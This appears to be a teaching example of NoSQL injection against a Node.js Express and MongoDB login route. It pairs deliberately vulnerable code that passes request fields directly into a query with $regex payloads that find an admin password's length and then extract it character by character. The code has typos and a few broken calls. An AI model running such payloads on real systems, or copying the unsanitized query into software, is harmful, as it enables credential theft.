// Figure 11
const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded( {extended : false} ));
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connection('mongodb://localhost:27017/', { useNewUrlParser:
true, useUnigiedTopology: true});
app.get('/query', function(req,res) {
    db.collection('user').findOne({
        'uid': req.body.uid,
        'upw': req.body.upw
    }, function(err, result){
        if(err) throw err;
        console.log(result);
        if(result){
            res.send(result['uid']);
        } else {
            res.send('undefined');
        }
    })
});
const server = app.listen(80,function(){
    console.log('app.listen');
});


// 비밀번호 길이 획득 , 비밀번호 획득
{"uid":"admin", "upw":{"&regex":".{5}"}}
=> admin
{"uid":"admin", "upw":{"&regex":".{6}"}}
=> undefined


{"uid":"admin", "upw": {"$regex":"^a"}}
=> admin
{"uid": "admin", "upw": {"$regex":"^aa"}}
=> undefined
{"uid": "admin", "upw": {"$regex":"^ab"}}
=> undefined
{"uid": "admin", "upw": {"$regex":"^ap"}}
=> admin

...app
{"uid": "admin", "upw": {"$regex":"^apple$"}}